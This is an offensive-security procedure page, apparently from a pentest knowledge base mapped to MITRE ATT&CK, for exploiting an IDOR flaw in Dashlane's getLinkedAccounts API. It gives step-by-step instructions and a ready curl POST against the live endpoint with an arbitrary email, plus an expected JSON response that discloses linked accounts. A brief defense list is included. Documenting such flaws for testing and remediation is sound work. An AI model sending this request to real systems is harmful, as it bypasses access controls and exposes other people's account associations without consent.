---
id: proc-exploit-idor-dashlane
tags:
  - idor
  - api-exploitation
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-post-getlinkedaccounts]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:29:36.690Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Send-IDOR-POST-to-GetLinkedAccounts

## Summary

This procedure exploits an IDOR vulnerability in Dashlane's /1/account/getLinkedAccounts endpoint by sending a POST request with an arbitrary email, bypassing access controls to retrieve linked account emails.

## Description

The attack leverages missing authorization checks, allowing any authenticated user to query linked accounts for unrelated emails. Technical approach involves crafting a form-urlencoded POST with the target email parameter, including session cookies. Expected outcomes: JSON response disclosing linked emails, leading to privacy leaks. Prerequisites: Authenticated session and knowledge of the endpoint.

## Requirements

1. Valid session cookies from Dashlane login
2. Tool for HTTP requests (e.g., curl or Burp Suite)
3. Target email to query (e.g., pentester.owasp@gmail.com)

## Defense

Defensive measures and detection strategies:

- Implement server-side validation to ensure queried emails belong to the authenticated user
- Rate-limit API requests and monitor for anomalous email queries
- Use proper access control lists (ACLs) on endpoints

## Objectives

1. Bypass access controls on linked accounts API
2. Retrieve unauthorized email associations
3. Demonstrate privacy impact of IDOR

## Instructions

### Step 1: Prepare Request Headers and Body

**Context**: Set up the POST request with required headers mimicking browser behavior.

Include User-Agent, Content-Type, Referer, and authentication cookies.

### Step 2: Execute POST Request

**Context**: Send the request with arbitrary email to exploit IDOR.

Execute [[commands/curl-post-getlinkedaccounts]] to verify:

```bash
curl -X POST 'https://www.dashlane.com/1/account/getLinkedAccounts' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Referer: https://www.dashlane.com/business/try' \
  -b 'your_session_cookies_here' \
  -d 'email=pentester.owasp@gmail.com'
```

> Expected output: {"code":200,"message":"OK","content":{"logins":["pentester.owasp@gmail.com","arbaz.owasp@gmail.com","hacker.arbaz@gmail.com"]}}.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-getlinkedaccounts]]

## Tools Used


## Tags

- idor
- api-exploitation
